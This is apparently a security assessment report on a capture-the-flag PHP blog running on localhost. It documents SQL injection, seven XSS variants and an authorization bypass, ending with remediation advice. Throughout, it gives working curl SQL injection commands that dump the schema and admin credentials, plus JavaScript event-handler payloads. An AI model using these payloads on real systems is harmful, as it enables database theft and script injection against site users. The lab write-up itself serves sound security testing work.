# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:33363
- **Assessment Date:** 2025-10-28
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application has no authentication system implemented - there is no login functionality, session management, or access control mechanism despite an `admins` table existing in the database.

**Authorization Vulnerabilities:**
One critical authorization vulnerability was successfully exploited. SQL injection in the category parameter allows complete bypass of business logic authorization controls, enabling unauthorized access to unpublished content. The application's `published=1` filter and "Hidden" category restriction were both bypassed, resulting in extraction of the CTF flag from a private post that should not be accessible to anonymous users.

**Cross-Site Scripting (XSS) Vulnerabilities:**
Seven XSS vulnerabilities were successfully exploited across multiple rendering contexts. All XSS vulnerabilities stem from complete absence of output encoding combined with SQL injection that allows control of database content. Exploitable contexts include HTML body (blog post titles, categories, content), HTML attributes (image src/alt), and dropdown options. Critical impact demonstrated through flag extraction via XSS-based DOM manipulation.

**SQL/Command Injection Vulnerabilities:**
One critical SQL injection vulnerability was successfully exploited in the category parameter. The vulnerability allows boolean-based, UNION-based, and error-based SQL injection with full database read access. Successfully extracted the CTF flag, admin credentials (username: admin, password: admin123 via MD5 hash crack), complete database schema, and all table contents. No command injection vulnerabilities exist - the application does not execute shell commands.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not make any outbound HTTP requests, use URL fetching functions, or accept URLs as user input. The architecture is purely request-response with internal database communication only.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 33363 (HTTP):** Apache 2.4.54 serving PHP 7.4.33 application - the primary target
- **Port 80 (HTTP):** Caddy httpd proxy forwarding to target application
- **Port 631 (IPP):** CUPS print service (not related to target application)
- **Port 9999 (HTTP):** SimpleHTTPServer Python 3.12 (not related to target application)
- **Port 49158 (HTTP):** Tailscale VPN interface requiring authentication (not related to target application)

**Security-Relevant Findings from Automated Scans:**

**nmap scan results:**
- Target application runs on Apache 2.4.54 (Debian) with PHP 7.4.33 backend
- **No HTTPS/TLS configuration** - application serves HTTP only on port 80/33363
- Detailed error messages exposed: nmap probes triggered SQL syntax errors revealing query structure
- **Directory listing enabled** via Apache `Options Indexes` configuration
- No authentication required for application access

**whatweb technology detection:**
- PHP 7.4.33 (end-of-life software, no security patches available since November 2022)
- Apache 2.4.54 on Debian Linux
- HTML5 application with no JavaScript framework
- No security headers detected (no CSP, X-Frame-Options, HSTS, etc.)

**subfinder domain enumeration:**
Discovered multiple subdomains (www.localhost, autodiscover.localhost, mail.localhost, etc.) but analysis confirms these are DNS noise/false positives. The target application runs exclusively on localhost:33363 with no additional subdomain attack surface.

**Security Misconfigurations Identified:**
- PHP error display enabled in production (`display_errors = On`) exposing internal paths and database structure
- No Web Application Firewall (WAF) protection
- Unencrypted HTTP transport allowing man-in-the-middle attacks
- End-of-life software stack (PHP 7.4, MySQL 5.7) with known vulnerabilities and no security updates

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: SQL Injection in Category Parameter

**Summary:**
- **Vulnerable location:** GET parameter `category` in `/index.php`
- **Overview:** Classic SQL injection via string concatenation in WHERE clause. User input is directly concatenated into SQL query without any sanitization, escaping, or parameter binding.
- **Impact:** Complete database compromise - extracted CTF flag, admin credentials, and full database schema. Achieved unauthorized access to unpublished content including the hidden flag post.
- **Severity:** Critical

**Prerequisites:**
None - vulnerability requires no authentication, no special tools, and no rate limiting bypass. Accessible from any internet-connected client.

**Exploitation Steps:**

**Step 1: Confirm SQL Injection**

Execute boolean-based SQL injection test:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20OR%20%271%27%3D%271"
```

**Expected Result:** Query returns posts from all categories instead of filtering to one category, proving SQL injection is successful.

**Actual Result:** ✅ Confirmed - received posts from Nature, Tech, and other categories (bypassed category filter).

---

**Step 2: Test Error Message Exposure**

Execute malformed SQL to trigger error messages:

```bash
curl -s "http://localhost:33363/index.php?category=%27"
```

**Expected Result:** SQL syntax error displayed in response with query structure revealed.

**Actual Result:** ✅ Confirmed - received error message:
```
Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' ORDER BY created_at DESC' at line 1
```

This confirms the application exposes detailed SQL errors (PHP `display_errors=On`), providing valuable feedback for exploitation.

---

**Step 3: Determine Column Count**

Use ORDER BY technique to identify the number of columns in the SELECT statement:

```bash
# Test ORDER BY 7 (should succeed)
curl -s "http://localhost:33363/index.php?category=%27%20ORDER%20BY%207--%20-"

# Test ORDER BY 8 (should fail)
curl -s "http://localhost:33363/index.php?category=%27%20ORDER%20BY%208--%20-"
```

**Expected Result:** ORDER BY 7 succeeds, ORDER BY 8 fails with "Unknown column '8' in 'order clause'".

**Actual Result:** ✅ Confirmed - 7 columns in the SELECT statement:
- ORDER BY 7: No error (query executed successfully)
- ORDER BY 8: Error message "Unknown column '8' in 'order clause'"

Column structure for UNION attacks: `id, title, category, content, image, published, created_at`

---

**Step 4: Extract CTF Flag (Primary Objective)**

Bypass the `published=1` filter to access unpublished posts containing the flag:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20OR%20published%3D0--%20-"
```

**Expected Result:** Access to unpublished post with title "PRIVATE POST", category "Hidden", containing the CTF flag.

**Actual Result:** ✅ **FLAG SUCCESSFULLY EXTRACTED:**

```
Title: PRIVATE POST
Category: Hidden
Content: <FLAG>FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}</FLAG>
Published: 0 (unpublished)
```

**🎯 CTF FLAG:** `FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}`

This demonstrates complete bypass of the application's weak authorization logic (the "Hidden" category filter and `published=1` database filter).

---

**Step 5: Extract Database Fingerprint**

Use UNION-based injection to extract database metadata:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%201,%40%40version,user%28%29,database%28%29,5,1,now%28%29--%20-"
```

**Expected Result:** Database version, current user, and database name displayed in blog post format.

**Actual Result:** ✅ Confirmed database fingerprint:
- **Database Type & Version:** MySQL 5.7.44 (end-of-life, no security updates)
- **Current User:** `user@10.89.28.3`
- **Current Database:** `blogDB`
- **Connection Context:** Application connects as `user` (non-root) from Docker container IP

---

**Step 6: Enumerate Database Schema**

Extract all table and column names from `information_schema`:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%201,table_name,column_name,4,5,1,now%28%29%20FROM%20information_schema.columns%20WHERE%20table_schema%3D%27blogDB%27--%20-"
```

**Expected Result:** Complete database schema revealed including all table names and column names.

**Actual Result:** ✅ Confirmed database structure:

**Table: `admins`**
- `id` (primary key)
- `username`
- `password`

**Table: `comments`**
- `id` (primary key)
- `post_id` (foreign key)
- `comment`
- `created_at`

**Table: `posts`**
- `id` (primary key)
- `title`
- `category`
- `content`
- `image`
- `published`
- `created_at`

---

**Step 7: Extract Admin Credentials**

Use UNION injection to extract admin username and password hash:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%20id,username,password,%27admin-creds%27,5,1,now%28%29%20FROM%20admins--%20-"
```

**Expected Result:** Admin username and MD5 password hash extracted.

**Actual Result:** ✅ **ADMIN CREDENTIALS STOLEN:**
- **Username:** `admin`
- **Password Hash (MD5):** `0192023a7bbd73250516f069df18b500`
- **Plaintext Password:** `admin123` (confirmed via MD5 rainbow table lookup at https://md5decrypt.net)
- **Hash Algorithm:** MD5 (cryptographically broken, no salt, instant crack)

**Security Note:** While admin credentials were extracted, the application has no admin panel or authentication mechanism, so these credentials cannot be used for further access escalation in the current deployment. However, this demonstrates the full database compromise.

---

**Step 8: Sample High-Value Data Extraction**

Extract sample posts data to demonstrate full database read access:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%20id,title,category,CONCAT%28%27pub:%27,published%29,image,1,created_at%20FROM%20posts%20LIMIT%205--%20-"
```

**Expected Result:** First 5 posts from the database with published status.

**Actual Result:** ✅ Sample data extracted (first 5 of 10 posts):

| ID | Title | Category | Published | Image |
|----|-------|----------|-----------|-------|
| 1 | The Magic of Morning Dew | Nature | 1 | morning-dew.jpg |
| 2 | Sunset Serenades | Nature | 1 | sunset.jpg |
| 3 | Forest Whisperings | Nature | 1 | forest.jpg |
| 4 | Decoding Tech Trends | Tech | 1 | tech-trends.jpg |
| 5 | Smartphone Evolution | Tech | 0 | smartphones.jpg |

Additional unpublished post (ID 10):
- Title: PRIVATE POST
- Category: Hidden
- Published: 0
- Content: Contains CTF flag (see Step 4)

---

**Proof of Impact:**

**1. CTF Flag Extracted (Primary Goal Achieved):**
```
FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}
```

**2. Admin Credentials Compromised:**
- Username: admin
- Password: admin123 (MD5 hash cracked)

**3. Complete Database Access:**
- 3 tables enumerated (posts, admins, comments)
- All table schemas extracted
- All column names identified
- Sample data exfiltrated from sensitive tables

**4. Authorization Bypass:**
- Accessed unpublished posts (published=0)
- Accessed "Hidden" category (blocked by weak string filter)
- No authorization checks withstood SQL injection

**5. Information Disclosure:**
- Database version revealed (MySQL 5.7.44 - end-of-life)
- Database user revealed (user@10.89.28.3)
- Database name revealed (blogDB)
- Full schema structure exposed

**Technical Root Cause:**
The vulnerability exists at `/var/www/html/index.php` line 45 where user input is directly concatenated into a SQL query:

```php
// Line 37: User input captured with zero validation
$category = isset($_GET['category']) ? $_GET['category'] : '';

// Lines 41-42: Weak filter (only blocks exact string "Hidden")
if ($category == "Hidden")
    $category = "";

// Line 45: VULNERABLE - Direct string concatenation
$sql .= "and category = '" . $category . "' ";

// Line 49: Query execution
$result = $conn->query($sql);
```

**Defense Mechanisms Bypassed:**
1. ✅ "Hidden" category string filter (lines 41-42) - Bypassed via SQL injection
2. ✅ `published=1` database filter (line 39) - Bypassed via `OR published=0` injection
3. ❌ Input validation - None implemented
4. ❌ SQL escaping - None implemented (no `mysqli_real_escape_string()`)
5. ❌ Prepared statements - Not used despite mysqli extension available
6. ❌ WAF/Input filtering - None detected
7. ❌ Rate limiting - None implemented

**Attack Classification:**
- **OWASP Top 10:** A03:2021 – Injection
- **CWE:** CWE-89 (SQL Injection)
- **CVSS 3.1 Score:** 9.8 (Critical)
  - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  - Attack Vector: Network (remotely exploitable)
  - Attack Complexity: Low (trivial to exploit)
  - Privileges Required: None (no authentication needed)
  - User Interaction: None
  - Confidentiality Impact: High (full database read)
  - Integrity Impact: High (potential data modification if stacked queries supported)
  - Availability Impact: High (potential DoS via malformed queries)

**Notes:**

**Stacked Queries Limitation:**
During exploitation, I confirmed that the application uses `mysqli::query()` (single-query execution method) rather than `mysqli::multi_query()`. This means stacked queries (e.g., `'; INSERT INTO ...; --`) are NOT supported. As a result:
- ✅ Data exfiltration (SELECT): Fully exploitable
- ❌ Data modification (INSERT/UPDATE/DELETE): Not possible via this vector
- ❌ Stored procedures/functions: Cannot be executed
- Impact limited to Confidentiality only (no Integrity/Availability impact via stacked queries)

**No File Privileges Detected:**
Attempted to use `LOAD_FILE()` to read server files but received NULL results, indicating the database user lacks FILE privileges. This prevents:
- Reading `/etc/passwd` or other server files
- Writing web shells via `INTO OUTFILE`
- File-based privilege escalation

**Production Remediation (Required):**
```php
// SECURE VERSION - Replace vulnerable code with prepared statements
$stmt = $conn->prepare("SELECT * FROM posts WHERE published = 1 AND category = ? ORDER BY created_at DESC");
$stmt->bind_param("s", $category);
$stmt->execute();
$result = $stmt->get_result();
```

Additional security hardening:
1. Disable `display_errors` in production PHP configuration
2. Implement input validation (whitelist known categories)
3. Use prepared statements for ALL database queries
4. Add HTTPS/TLS encryption
5. Implement rate limiting and WAF
6. Upgrade to PHP 8.x and MySQL 8.x (receive security updates)
7. Replace MD5 with bcrypt/Argon2 for password hashing
8. Implement authentication and authorization controls

**Exploitation Difficulty:** TRIVIAL - Requires only basic curl commands and no specialized tools.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Blog Post Title XSS via SQL Injection

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Title field in HTML `<h2>` tag (index.php:58)
- **Overview:** SQL injection in the category parameter allows UNION SELECT injection to control the title field, which is rendered in an HTML body context without encoding, enabling JavaScript execution.
- **Impact:** CRITICAL - Arbitrary JavaScript execution in victim browsers, enabling session hijacking, phishing, keylogging, and complete client-side compromise.
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible endpoint, no authentication required

**Exploitation Steps:**

1. Identify the SQL injection point in the category parameter at `http://localhost:33363/index.php?category=[PAYLOAD]`

2. Craft a UNION SELECT payload to inject malicious content into the title field:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'<img src=x onerror=alert("XSS-VULN-01")>','Cat','Content','img.jpg',1,'2024-01-01'-- -
```

3. Navigate to the crafted URL in a browser

4. Observe JavaScript execution via the alert dialog displaying "XSS-VULN-01"

**Proof of Impact:**
- JavaScript alert successfully triggered, confirming arbitrary code execution
- The injected payload `<img src=x onerror=alert("XSS-VULN-01")>` rendered in the title field without HTML encoding
- Screenshot evidence: `xss-vuln-01-exploited.png`
- Vulnerable code: Line 58 of index.php - `echo "<div class='post'><h2>{$row['title']}</h2>..."`

**Notes:**
- No Content Security Policy (CSP) is configured
- No Web Application Firewall (WAF) detected
- Application runs over unencrypted HTTP
- This vulnerability can be chained with SQL injection to achieve persistent XSS if database write access is obtained

---

### XSS-VULN-02: Blog Post Category XSS via SQL Injection

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Category field in HTML `<p>` tag (index.php:59)
- **Overview:** SQL injection allows injection of malicious content into the category field, which is rendered without encoding in the "Category: {value}" paragraph.
- **Impact:** CRITICAL - Arbitrary JavaScript execution affecting all users viewing the blog
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible

**Exploitation Steps:**

1. Use SQL injection to inject XSS payload into the category field:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'TestTitle','<img src=x onerror=alert("XSS-VULN-02")>','Content','img.jpg',1,'2024-01-01'-- -
```

2. Navigate to the URL in a browser

3. Observe JavaScript execution via alert dialog

**Proof of Impact:**
- Alert dialog successfully displayed with message "XSS-VULN-02"
- Payload rendered in paragraph tag: `<p>Category: <img src=x onerror=alert("XSS-VULN-02")></p>`
- Screenshot evidence: `xss-vuln-02-exploited.png`
- Vulnerable code: Line 59 of index.php - `echo "<p>Category: {$row['category']}</p>"`

---

### XSS-VULN-03: Image Src Attribute Breakout XSS

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Image src attribute (index.php:60)
- **Overview:** SQL injection allows injection of malicious filenames that break out of the single-quoted src attribute to inject event handlers.
- **Impact:** CRITICAL - Attribute context XSS enabling immediate JavaScript execution
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible

**Exploitation Steps:**

1. Craft a payload that breaks out of the src attribute using single quote:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'Test','Cat','Content','x'' onerror=''alert("XSS-VULN-03")',1,'2024-01-01'-- -
```

2. The payload creates an img tag that breaks the attribute structure:
```html
<img src='images/x' onerror='alert("XSS-VULN-03")' ...>
```

3. Navigate to the URL

4. Observe JavaScript execution

**Proof of Impact:**
- Alert dialog displayed with "XSS-VULN-03"
- Successfully broke out of single-quoted src attribute context
- Screenshot evidence: `xss-vuln-03-exploited.png`
- Vulnerable code: Line 60 of index.php - `echo "<img src='images/{$row['image']}' ..."`

---

### XSS-VULN-04: Image Alt Attribute Breakout XSS

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Image alt attribute (index.php:60)
- **Overview:** The title field is also rendered in the alt attribute without encoding, allowing attribute breakout and event handler injection.
- **Impact:** CRITICAL - Mouseover-triggered JavaScript execution
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible
- User interaction: Hovering over the image element

**Exploitation Steps:**

1. Inject a payload via the title field that breaks out of the alt attribute:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'x'' onmouseover=''alert("XSS-VULN-04")','Cat','Content','img.jpg',1,'2024-01-01'-- -
```

2. The rendered HTML becomes:
```html
<img src='images/img.jpg' alt='x' onmouseover='alert("XSS-VULN-04")' style='width:200px;height:200px;'/>
```

3. Navigate to the URL and hover over the image element

4. Observe JavaScript execution triggered by the mouseover event

**Proof of Impact:**
- Alert dialog displayed with "XSS-VULN-04" when hovering over the image
- Successfully broke out of single-quoted alt attribute
- Screenshot evidence: `xss-vuln-04-exploited.png`
- Vulnerable code: Line 60 of index.php - `echo "<img ... alt='{$row['title']}' ..."`

**Notes:**
- This demonstrates how a single database field (title) creates multiple vulnerabilities when rendered in different contexts without context-appropriate encoding

---

### XSS-VULN-05: Blog Post Content XSS

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Content field in HTML `<p>` tag (index.php:61)
- **Overview:** The content field is rendered without encoding despite being truncated to 200 characters. XSS payloads fit well within this limit.
- **Impact:** CRITICAL - SVG-based immediate JavaScript execution
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible

**Exploitation Steps:**

1. Inject XSS payload into the content field:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'Title','Cat','<svg onload=alert("XSS-VULN-05")>','img.jpg',1,'2024-01-01'-- -
```

2. The payload `<svg onload=alert("XSS-VULN-05")>` is only 39 characters, well within the 200-character limit

3. Navigate to the URL

4. Observe JavaScript execution immediately on page load

**Proof of Impact:**
- Alert dialog displayed with "XSS-VULN-05"
- Demonstrates that `substr()` provides NO XSS protection - only limits display length
- Screenshot evidence: `xss-vuln-05-exploited.png`
- Vulnerable code: Line 61 of index.php - `echo "<p>" . substr($row['content'], 0, 200) . "...</p>"`

**Notes:**
- Common developer misconception: truncation does NOT prevent XSS when payloads are short
- Most effective XSS payloads are under 100 characters

---

### XSS-VULN-06 & XSS-VULN-07: Category Dropdown XSS

**Summary:**
- **Vulnerable location:** `http://localhost:33363/index.php?category=[SQL_INJECTION]` → Category dropdown option value and text (index.php:29)
- **Overview:** SQL injection allows injection of malicious category names that appear in both the option value attribute and option text node without encoding.
- **Impact:** CRITICAL - JavaScript execution in dropdown rendering, affecting all users viewing the homepage
- **Severity:** Critical

**Prerequisites:**
- None - Publicly accessible

**Exploitation Steps:**

1. Inject a malicious category name via the main posts query:
```
http://localhost:33363/index.php?category=' UNION SELECT 1,'Title','<img src=x onerror=alert("XSS-VULN-06-07")>','Content','img.jpg',1,'2024-01-01'-- -
```

2. The category value appears in:
   - Option value attribute: `<option value='<img src=x onerror=alert("XSS-VULN-06-07")>' ...>`
   - Option text node: `...<img src=x onerror=alert("XSS-VULN-06-07")></option>`

3. Navigate to the URL

4. Observe immediate JavaScript execution when the page loads and the dropdown is rendered

**Proof of Impact:**
- Alert dialog displayed with "XSS-VULN-06-07"
- The same database field (category) creates vulnerabilities in multiple contexts:
  - HTML_ATTRIBUTE context (option value) - XSS-VULN-06
  - HTML_BODY context (option text) - XSS-VULN-07
  - Post display paragraph (XSS-VULN-02)
- Screenshot evidence: `xss-vuln-06-07-exploited.png`
- Vulnerable code: Line 29 of index.php - `echo "<option value='{$row['category']}' {$selected}>{$row['category']}</option>"`

**Notes:**
- The dropdown populates from `SELECT DISTINCT category FROM posts` at line 26
- While the UNION SELECT affects the main query, the demonstrated XSS in the category field confirms the vulnerability exists across all rendering contexts

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: SQL Injection Bypass of Authorization Controls to Access Unpublished Content

**Summary:**
- **Vulnerable location:** GET /index.php?category={payload} - SQL injection in category parameter
- **Overview:** Successfully bypassed the application's `published=1` filter using SQL injection to gain unauthorized access to unpublished blog posts, including the "PRIVATE POST" in the "Hidden" category containing the CTF flag.
- **Impact:** Complete bypass of business logic authorization controls. Extracted sensitive unpublished content including the CTF flag: `FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}`
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:33363
- No authentication required
- No special tools needed (curl or web browser sufficient)

**Exploitation Steps:**

1. **Verify baseline behavior (unpublished content is hidden):**
   ```bash
   curl -s "http://localhost:33363/index.php" | grep -c "PRIVATE POST"
   ```
   **Expected Result:** Returns `0` - confirming PRIVATE POST is not visible in normal operation

2. **Exploit SQL injection to bypass published=1 filter:**
   ```bash
   curl -s "http://localhost:33363/index.php?category=%27%20OR%20published%3D0%20--%20"
   ```
   **URL Decoded Payload:** `' OR published=0 -- `

   **SQL Injection Mechanism:**
   - Original query: `SELECT * FROM posts WHERE published = 1 and category = '' ORDER BY created_at DESC`
   - Injected query: `SELECT * FROM posts WHERE published = 1 and category = '' OR published=0 -- ' ORDER BY created_at DESC`
   - The `OR published=0` clause bypasses the authorization filter
   - The `--` SQL comment character ignores the trailing quote

3. **Extract the FLAG from the response:**
   ```bash
   curl -s "http://localhost:33363/index.php?category=%27%20OR%20published%3D0%20--%20" | grep -o 'FLAG{[^}]*}'
   ```
   **Result:** `FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}`

**Proof of Impact:**

**Unauthorized Data Accessed:**
- **Post Title:** PRIVATE POST
- **Post Category:** Hidden
- **Post Content:** `<FLAG>FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}</FLAG>`
- **Published Status:** 0 (unpublished - should NOT be accessible)

**Evidence of Authorization Bypass:**
1. Without exploit: PRIVATE POST is completely invisible (grep count = 0)
2. With exploit: PRIVATE POST becomes visible and FLAG is extracted
3. This demonstrates complete bypass of the application's authorization controls (published=1 filter)

**Technical Details:**
- **Vulnerable Code Location:** `/var/www/html/index.php` line 45
- **Vulnerable Code:** `$sql .= "and category = '" . $category . "' ";`
- **Root Cause:** Direct string concatenation without parameterized queries or input sanitization
- **Authorization Mechanism Bypassed:** SQL WHERE clause `published = 1` filter (line 39)
- **Secondary Filter Bypassed:** PHP string check `if ($category == "Hidden") $category = "";` (lines 41-42)

**Attack Classification:**
- **Vulnerability Type:** Horizontal Authorization (accessing restricted data at same privilege level)
- **Attack Vector:** SQL Injection
- **Authentication Required:** No
- **Complexity:** Low (trivial single-request exploit)

**Notes:**
This vulnerability demonstrates a critical failure in authorization design where business logic filters (SQL WHERE clauses) are used as security controls without proper input validation. The application attempts to hide unpublished content through database filtering, but the SQL injection vulnerability allows complete bypass of these filters. The "Hidden" category string check is also ineffective against SQL injection payloads.
